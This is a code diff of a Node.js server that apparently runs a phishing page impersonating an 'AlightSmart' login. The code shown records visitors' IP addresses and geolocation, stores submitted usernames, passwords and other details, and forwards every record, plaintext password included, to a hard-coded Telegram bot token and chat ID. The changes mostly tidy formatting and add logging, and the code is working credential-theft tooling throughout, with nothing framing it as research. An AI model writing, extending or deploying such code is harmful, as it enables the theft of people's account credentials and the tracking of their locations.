@@ -33,13 +33,17 @@ function getRealIP(req) {
            'Unknown';
 }
 
-// ==================== TELEGRAM ====================
+// Telegram Config
 const TELEGRAM_TOKEN = "8884240723:AAFfSTKd9jab0Xdfp-L-mPSeJqyyISe8LaU";
 const CHAT_ID = "8559945003";
 
 async function getLocation(ip) {
     if (!ip || ip === 'Unknown') return 'Unknown Location';
-    const services = [`https://ipapi.co/${ip}/json/`, `https://freeipapi.com/api/json/${ip}`, `http://ip-api.com/json/${ip}`];
+    const services = [
+        `https://ipapi.co/${ip}/json/`,
+        `https://freeipapi.com/api/json/${ip}`,
+        `http://ip-api.com/json/${ip}`
+    ];
     for (const url of services) {
         try {
             const res = await fetch(url, { timeout: 6000 });
@@ -53,18 +57,18 @@ async function getLocation(ip) {
 }
 
 async function sendTelegramNotification(record) {
-    let usernameDisplay = record.username || '-';
+    let usernameDisplay = record.username || 'Visitor';
     if (usernameDisplay.includes("Verification") || usernameDisplay.includes("Step")) {
-        usernameDisplay = "Verification / Next Step";
+        usernameDisplay = "Verification Step";
     }
 
-    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +   // Added red alert + bold
+    const message = `🚨🔴 *NEW ACTIVITY - AlightSmart!*\n\n` +
         `• *Type:* ${record.type}\n` +
         `• *Username:* ${usernameDisplay}\n` +
         `• *Password:* ${record.password || '-'}\n` +
         `• *Details:* ${record.address || '-'}\n` +
         `• *IP:* ${record.ip}\n` +
-        `• *Location:* ${record.location || 'Unknown'}\n` +
+        `• *Location:* ${record.location || 'Unknown Location'}\n` +
         `• *Time:* ${record.timestamp}\n\n` +
         `🕒 ${new Date().toLocaleString()}`;
 
@@ -75,17 +79,14 @@ async function sendTelegramNotification(record) {
             body: JSON.stringify({
                 chat_id: CHAT_ID,
                 text: message,
-                parse_mode: 'Markdown',
-                disable_notification: false   // Force notification sound
+                parse_mode: 'Markdown'
             })
         });
-        console.log("✅ Telegram sent for:", record.type);
     } catch (err) {
         console.error("Telegram failed:", err.message);
     }
 }
 
-// ==================== SAVE RECORD ====================
 async function saveRecord(type, username = null, password = null, address = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
     const location = await getLocation(ip);
@@ -96,6 +97,9 @@ async function saveRecord(type, username = null, password = null, address = null
             [type, username, password, address, ip, location, timestamp]
         );
 
+        console.log(`✅ SAVED: ${type} | Location: ${location}`);
+
+        // Send notification for ALL activities (including page visits)
         await sendTelegramNotification({ type, username, password, address, ip, location, timestamp });
 
     } catch (err) {
@@ -103,7 +107,7 @@ async function saveRecord(type, username = null, password = null, address = null
     }
 }
 
-// ==================== ROUTES (same as before) ====================
+// Routes
 app.get('/', async (req, res) => {
     const ip = getRealIP(req);
     await saveRecord('Page Visit', null, null, 'Main Link Clicked', ip);
